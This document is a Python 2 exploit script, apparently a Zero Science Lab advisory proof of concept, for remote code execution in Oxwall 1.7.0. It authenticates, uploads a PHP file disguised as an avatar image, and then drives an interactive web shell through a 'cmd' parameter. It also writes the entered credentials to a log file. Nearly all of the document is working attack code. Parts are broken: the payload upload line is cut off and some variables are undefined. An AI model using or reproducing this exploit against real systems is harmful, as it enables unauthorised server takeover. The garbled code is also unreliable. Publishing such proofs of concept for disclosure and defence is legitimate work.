 
import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import logging, os, time, datetime, re
 
from colorama import Fore, Back, Style, init
from cStringIO import StringIO
from urllib2 import URLError
 
init()
 
if os.name == &#039;posix&#039;: os.system(&#039;clear&#039;)
if os.name == &#039;nt&#039;: os.system(&#039;cls&#039;)
piton = os.path.basename(sys.argv[0])
 
def bannerche():
    print &#039;&#039;&#039;
 @---------------------------------------------------------------@
 |                                                               |
 |          Oxwall 1.7.0 Remote Code Execution Exploit           |
 |                                                               |
 |                                                               |
 |                       ID: ZSL-2014-5196                       |
 |                                                               |
 |              Copyleft (c) 2014, Zero Science Lab              |
 |                                                               |
 @---------------------------------------------------------------@
          &#039;&#039;&#039;
    if len(sys.argv) < 2:
        print &#039;\n\x20\x20[*] &#039;+Fore.YELLOW+&#039;Usage: &#039;+Fore.RESET+piton+&#039; <hostname>\n&#039;
        print &#039;\x20\x20[*] &#039;+Fore.CYAN+&#039;Example: &#039;+Fore.RESET+piton+&#039; zeroscience.mk\n&#039;
        sys.exit()
 
bannerche()
 
print &#039;\n\x20\x20[*] Initialising exploit &#039;+&#039;.&#039;*34+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
host = sys.argv[1]
 
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 
try:
    opener.open(&#039;http://&#039;+host+&#039;/sign-in?back-uri=admin&#039;)
except urllib2.HTTPError, errorzio:
    if errorzio.code == 404:
        print &#039;\x20\x20[*] Checking path &#039;+&#039;.&#039;*41+Fore.RED+&#039;[ER]&#039;+Fore.RESET
        print &#039;\x20\x20[*] &#039;+Fore.YELLOW+&#039;Check your path entry.&#039;+Fore.RESET
        print
        sys.exit()
except URLError, errorziocvaj:
    if errorziocvaj.reason:
        print &#039;\x20\x20[*] Checking host &#039;+&#039;.&#039;*41+Fore.RED+&#039;[ER]&#039;+Fore.RESET
        print &#039;\x20\x20[*] &#039;+Fore.YELLOW+&#039;Check your hostname entry.&#039;+Fore.RESET
        print
        sys.exit()
 
print &#039;\x20\x20[*] Checking host and path &#039;+&#039;.&#039;*32+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
print &#039;\x20\x20[*] Login please.&#039;
 
username = raw_input(&#039;\x20\x20[*] Enter username: &#039;)
password = raw_input(&#039;\x20\x20[*] Enter password: &#039;)
 
login_data = urllib.urlencode({
                            &#039;form_name&#039; : &#039;sign-in&#039;,
                            &#039;identity&#039; : username,
                            &#039;password&#039; : password,
                            &#039;remember&#039; : &#039;on&#039;,
                            &#039;submit&#039; : &#039;Sign In&#039;
                            })
 
try:
    login = opener.open(&#039;http://&#039;+host+&#039;/sign-in?back-uri=admin&#039;, login_data)
    auth = login.read()
except urllib2.HTTPError, errorziotraj:
    if errorziotraj.code == 403:
        print &#039;\x20\x20[*] &#039;+Fore.RED+&#039;Blocked by WAF.&#039;+Fore.RESET
        print
        sys.exit()
 
for session in cj:
    sessid = session.name
 
print &#039;\x20\x20[*] Mapping session ID &#039;+&#039;.&#039;*36+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
ses_chk = re.search(r&#039;%s=\w+&#039; % sessid , str(cj))
cookie = ses_chk.group(0)
print &#039;\x20\x20[*] Cookie: &#039;+Fore.YELLOW+cookie+Fore.RESET
 
if re.search(r&#039;Invalid username or email&#039;, auth):
    print &#039;\x20\x20[*] Invalid username or email given &#039;+&#039;.&#039;*23+Fore.RED+&#039;[ER]&#039;+Fore.RESET
    print
    sys.exit()
elif re.search(r&#039;Invalid password&#039;, auth):
    print &#039;\x20\x20[*] Invalid password &#039;+&#039;.&#039;*38+Fore.RED+&#039;[ER]&#039;+Fore.RESET
    sys.exit()
else:
    print &#039;\x20\x20[*] Authenticated &#039;+&#039;.&#039;*41+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
 
class MultiPartForm(object):
 
    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
     
    def get_content_type(self):
        return &#039;multipart/form-data; boundary=%s&#039; % self.boundary
 
    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return
 
    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or &#039;application/octet-stream&#039;
        self.files.append((fieldname, filename, mimetype, body))
        return
     
    def __str__(self):
 
        parts = []
        part_boundary = &#039;--&#039; + self.boundary
         
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: form-data; name="%s"&#039; % name,
              &#039;&#039;,
              value,
            ]
            for name, value in self.form_fields
            )
         
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: file; name="%s"; filename="%s"&#039; % \
                 (field_name, filename),
              &#039;Content-Type: %s&#039; % content_type,
              &#039;&#039;,
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
         
        flattened = list(itertools.chain(*parts))
        flattened.append(&#039;--&#039; + self.boundary + &#039;--&#039;)
        flattened.append(&#039;&#039;)
        return &#039;\r\n&#039;.join(flattened)
 
if __name__ == &#039;__main__&#039;:
 
    form = MultiPartForm()
    form.add_field(&#039;form_name&#039;, &#039;userSettingsForm&#039;)
    form.add_field(&#039;displayName&#039;, &#039;realname&#039;)
    form.add_field(&#039;confirmEmail&#039;, &#039;on&#039;)
    form.add_field(&#039;avatarSize&#039;, &#039;90&#039;)
    form.add_field(&#039;bigAvatarSize&#039;, &#039;190&#039;)
    form.add_field(&#039;avatar&#039;, &#039;&#039;)
    form.add_field(&#039;join_display_photo_upload&#039;, &#039;display&#039;)
    form.add_field(&#039;save&#039;, &#039;Save&#039;)
     
    form.add_file(&#039;bigAvatar&#039;, &#039;thricerbd.php5&#039;, 
 
    request = urllib2.Request(&#039;http://&#039;+host+&#039;/admin/settings/user&#039;)
    request.add_header(&#039;User-agent&#039;, &#039;joxypoxy 3.0&#039;)
    body = str(form)
    request.add_header(&#039;Content-type&#039;, form.get_content_type())
    request.add_header(&#039;Cookie&#039;, cookie)
    request.add_header(&#039;Content-length&#039;, len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()
    print &#039;\x20\x20[*] Sending payload &#039;+&#039;.&#039;*39+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
    checkfilename = urllib2.urlopen(request).read()
    filename = re.search(&#039;default_avatar_big_(\w+)&#039;, checkfilename).group(1)
    print &#039;\x20\x20[*] Getting file name &#039;+&#039;.&#039;*37+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
    print &#039;\x20\x20[*] File name: &#039;+Fore.YELLOW+&#039;default_avatar_big_&#039;+filename+&#039;.php5&#039;+Fore.RESET
 
opener.open(&#039;http://&#039;+host+&#039;/ow_userfiles/plugins/base/avatars/default_avatar_big_&#039;+filename+&#039;.php5&#039;)
print &#039;\x20\x20[*] Persisting file liwo.php5 &#039;+&#039;.&#039;*29+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
 
print &#039;\x20\x20[*] Starting logging service &#039;+&#039;.&#039;*30+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
print &#039;\x20\x20[*] Spawning shell &#039;+&#039;.&#039;*40+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
time.sleep(1)
 
furl = &#039;/ow_userfiles/plugins/base/avatars/liwo.php5&#039;
 
print
today = datetime.date.today()
fname = &#039;oxwall-&#039;+today.strftime(&#039;%d-%b-%Y&#039;)+time.strftime(&#039;_%H%M%S&#039;)+&#039;.log&#039;
logging.basicConfig(filename=fname,level=logging.DEBUG)
 
logging.info(&#039; &#039;+&#039;+&#039;*75)
logging.info(&#039; +&#039;)
logging.info(&#039; + Log started: &#039;+today.strftime(&#039;%A, %d-%b-%Y&#039;)+time.strftime(&#039;, %H:%M:%S&#039;))
logging.info(&#039; + Title: Oxwall 1.7.0 Remote Code Execution Exploit&#039;)
logging.info(&#039; + Python program executed: &#039;+sys.argv[0])
logging.info(&#039; + Version: &#039;+version)
logging.info(&#039; + Full query: \&#039;&#039;+piton+&#039;\x20&#039;+host+&#039;\&#039;&#039;)
logging.info(&#039; + Username input: &#039;+username)
logging.info(&#039; + Password input: &#039;+password)
logging.info(&#039; + Vector: &#039;+&#039;http://&#039;+host+furl)
logging.info(&#039; +&#039;)
logging.info(&#039; + Advisory ID: ZSL-2014-5196&#039;)
logging.info(&#039; + Zero Science Lab - http://www.zeroscience.mk&#039;)
logging.info(&#039; +&#039;)
logging.info(&#039; &#039;+&#039;+&#039;*75+&#039;\n&#039;)
 
print Style.DIM+Fore.CYAN+&#039;\x20\x20[*] Press [ ENTER ] to INSERT COIN!\n&#039;+Style.RESET_ALL+Fore.RESET
raw_input()
while True:
    try:
        cmd = raw_input(Fore.RED+&#039;shell@&#039;+host+&#039;:~# &#039;+Fore.RESET)
        execute = opener.open(&#039;http://&#039;+host+furl+&#039;?cmd=&#039;+urllib.quote(cmd))
        reverse = execute.read()
 
        print Style.BRIGHT+Fore.CYAN
        cmdout = pattern.match(reverse)
        print cmdout.groups()[0].strip()
        print Style.RESET_ALL+Fore.RESET
 
        if cmd.strip() == &#039;exit&#039;:
            break
 
        logging.info(&#039;Command executed: &#039;+cmd+&#039;\n\nOutput: \n&#039;+&#039;=&#039;*8+&#039;\n\n&#039;+cmdout.groups()[0].strip()+&#039;\n\n&#039;+&#039;-&#039;*60+&#039;\n&#039;)
    except Exception:
        break
 
logging.warning(&#039;\n\nLog ended: &#039;+today.strftime(&#039;%A, %d-%b-%Y&#039;)+time.strftime(&#039;, %H:%M:%S&#039;)+&#039;\n\nEND OF LOG&#039;)
print &#039;\x20\x20[*] Carpe commentarius &#039;+&#039;.&#039;*36+Fore.GREEN+&#039;[OK]&#039;+Fore.RESET
print &#039;\x20\x20[*] Log file: &#039;+Fore.YELLOW+fname+Fore.RESET
print
 
sys.exit()

